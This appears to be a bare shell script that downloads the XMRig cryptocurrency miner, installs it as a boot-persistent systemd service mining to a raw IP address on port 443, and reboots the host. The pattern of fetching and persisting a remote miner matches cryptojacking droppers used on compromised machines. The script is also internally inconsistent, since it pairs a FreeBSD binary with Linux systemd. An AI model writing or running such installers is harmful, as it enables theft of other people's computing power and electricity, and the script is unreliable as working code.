cd /usr/local/bin
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-freebsd-static-x64.tar.gz
sudo tar xvzf xmrig-6.18.0-freebsd-static-x64.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.18.0/xmrig -o 20.171.122.82:443 --randomx-no-rdmsr --tls true\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
sudo systemctl daemon-reload
sudo systemctl enable xmrig.service
echo "Setup completed!"
sudo reboot
